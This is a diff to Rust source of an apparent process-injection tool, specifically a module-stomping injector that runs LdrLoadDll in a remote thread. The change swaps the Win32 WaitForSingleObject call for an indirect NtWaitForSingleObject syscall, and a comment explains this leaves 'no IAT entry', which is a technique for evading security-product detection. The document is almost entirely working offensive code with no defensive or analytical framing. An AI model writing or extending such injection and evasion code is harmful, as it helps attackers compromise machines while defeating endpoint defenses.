@@ -497,11 +497,20 @@ impl Injector for ModuleStompInjector {
                     match thread_status {
                         Ok(s) if s >= 0 && !h_thread.is_null() => {
                             const LDRLOADDLL_TIMEOUT_MS: u32 = 30_000;
-                            let wait = winapi::um::synchapi::WaitForSingleObject(
-                                h_thread,
-                                LDRLOADDLL_TIMEOUT_MS,
+                            // NtWaitForSingleObject (indirect syscall, no IAT entry).
+                            let timeout_100ns: i64 =
+                                -((LDRLOADDLL_TIMEOUT_MS as i64) * 10_000);
+                            let timeout_bytes =
+                                std::mem::transmute::<i64, [u8; 8]>(timeout_100ns);
+                            let wait_status = syscall!(
+                                "NtWaitForSingleObject",
+                                h_thread as u64,      // Handle
+                                0u64,                  // Alertable = FALSE
+                                timeout_bytes.as_ptr() as u64, // Timeout
                             );
-                            if wait == winapi::um::winbase::WAIT_TIMEOUT {
+                            let wait_nt = wait_status.unwrap_or(-1i64);
+                            const STATUS_TIMEOUT: i64 = 0x00000102;
+                            if wait_nt == STATUS_TIMEOUT {
                                 log::warn!(
                                     "module_stomp: LdrLoadDll remote thread timed out after {}ms for {}",
                                     LDRLOADDLL_TIMEOUT_MS, candidate
@@ -511,10 +520,10 @@ impl Injector for ModuleStompInjector {
                                     h_thread as u64,
                                     1u64
                                 ).ok();
-                            } else if wait != 0 {
+                            } else if wait_nt != 0 {
                                 log::warn!(
-                                    "module_stomp: WaitForSingleObject returned {} for {}",
-                                    wait, candidate
+                                    "module_stomp: NtWaitForSingleObject returned {:#x} for {}",
+                                    wait_nt as u32, candidate
                                 );
                             }
                             syscall!("NtClose", h_thread as u64).ok();
